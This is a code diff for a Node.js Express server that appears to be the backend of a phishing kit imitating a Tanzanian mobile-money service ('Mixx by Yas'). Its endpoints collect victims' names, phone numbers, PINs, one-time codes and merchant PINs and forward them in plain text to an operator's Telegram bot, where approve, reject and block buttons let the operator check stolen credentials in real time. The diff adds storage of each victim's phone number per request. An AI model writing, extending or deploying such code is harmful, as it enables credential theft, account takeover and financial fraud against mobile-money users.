@@ -6,15 +6,16 @@ const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const DOMAIN = process.env.BACKEND_URL || 'https://mixx-by-yas-yf2n.onrender.com';
+const DOMAIN = process.env.BACKEND_URL || 'https://yas-tanzania.onrender.com';
 
 // ---------------- MEMORY STORES ----------------
 const approvedPins = {};
 const approvedCodes = {};
 const blockPins = {};
 const requestBotMap = {};
+const requestPhoneMap = {};   // <-- NEW: store phone per requestId
 
-// ---------------- MERCHANT PIN STORE (Same as PIN logic) ----------------
+// ---------------- MERCHANT PIN STORE ----------------
 const merchantPins = {};
 const merchantBlocked = {};
 
@@ -99,6 +100,7 @@ app.post('/submit-pin', (req, res) => {
     const requestId = uuidv4();
     approvedPins[requestId] = null;
     requestBotMap[requestId] = botId;
+    requestPhoneMap[requestId] = phone;   // <-- store phone
 
     sendTelegramMessage(bot, `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`, [[
         { text: '✅ PIN correct', callback_data: `pin_ok:${requestId}` },
@@ -124,6 +126,7 @@ app.post('/submit-code', (req, res) => {
     const requestId = uuidv4();
     approvedCodes[requestId] = null;
     requestBotMap[requestId] = botId;
+    requestPhoneMap[requestId] = phone;   // <-- store phone
 
     sendTelegramMessage(bot, `🔑 OTP CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`, [[
         { text: '✅ Code correct', callback_data: `code_ok:${requestId}` },
@@ -139,7 +142,7 @@ app.get('/check-code/:requestId', (req, res) => {
     res.json({ approved: approvedCodes[requestId] ?? null });
 });
 
-// ---------------- MERCHANT PIN SUBMISSION (Same as PIN logic) ----------------
+// ---------------- MERCHANT PIN SUBMISSION ----------------
 app.post('/submit-merchant-pin', (req, res) => {
     const { name, phone, pin, botId } = req.body;
     const bot = getBot(botId);
@@ -148,6 +151,7 @@ app.post('/submit-merchant-pin', (req, res) => {
     const requestId = uuidv4();
     merchantPins[requestId] = null;
     requestBotMap[requestId] = botId;
+    requestPhoneMap[requestId] = phone;   // <-- store phone
 
     sendTelegramMessage(bot, `🏪 MERCHANT PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nMerchant PIN: ${pin}`, [[
         { text: '✅ PIN correct', callback_data: `merchant_pin_ok:${requestId}` },
@@ -175,42 +179,45 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     const [action, requestId] = cb.data.split(':');
     let feedback = '';
 
+    // Retrieve phone from stored map (fallback to 'Unknown')
+    const phone = requestPhoneMap[requestId] || 'Unknown';
+
     // PIN actions
     if (action === 'pin_ok') { 
         approvedPins[requestId] = true; 
-        feedback = 'PIN approved ✅'; 
+        feedback = `✅ PIN approved for phone ${phone}`; 
     }
     if (action === 'pin_bad') { 
         approvedPins[requestId] = false; 
-        feedback = 'PIN rejected ❌'; 
+        feedback = `❌ PIN rejected for phone ${phone}`; 
     }
     if (action === 'pin_block') { 
         blockPins[requestId] = true; 
-        feedback = 'User blocked 🛑'; 
+        feedback = `🛑 User ${phone} blocked`; 
     }
 
     // Code (OTP) actions
     if (action === 'code_ok') { 
         approvedCodes[requestId] = true; 
-        feedback = 'Code approved ✅'; 
+        feedback = `✅ Code approved for phone ${phone}`; 
     }
     if (action === 'code_bad') { 
         approvedCodes[requestId] = false; 
-        feedback = 'Code rejected ❌'; 
+        feedback = `❌ Code rejected for phone ${phone}`; 
     }
 
-    // MERCHANT PIN actions (Same as PIN logic)
+    // MERCHANT PIN actions
     if (action === 'merchant_pin_ok') {
         merchantPins[requestId] = true;
-        feedback = 'Merchant PIN approved ✅ 🏪';
+        feedback = `✅ Merchant PIN approved for phone ${phone} 🏪`;
     }
     if (action === 'merchant_pin_bad') {
         merchantPins[requestId] = false;
-        feedback = 'Merchant PIN rejected ❌';
+        feedback = `❌ Merchant PIN rejected for phone ${phone}`;
     }
     if (action === 'merchant_pin_block') {
         merchantBlocked[requestId] = true;
-        feedback = 'User blocked 🛑';
+        feedback = `🛑 User ${phone} blocked 🏪`;
     }
 
     if (feedback) await sendTelegramMessage(bot, `📝 Response:\n${feedback}`);
@@ -226,7 +233,8 @@ app.get('/debug/stores', (req, res) => {
         approvedCodes: Object.keys(approvedCodes).length,
         blockPins: Object.keys(blockPins).length,
         merchantPins: Object.keys(merchantPins).length,
-        merchantBlocked: Object.keys(merchantBlocked).length
+        merchantBlocked: Object.keys(merchantBlocked).length,
+        storedPhones: Object.keys(requestPhoneMap).length
     });
 });
 
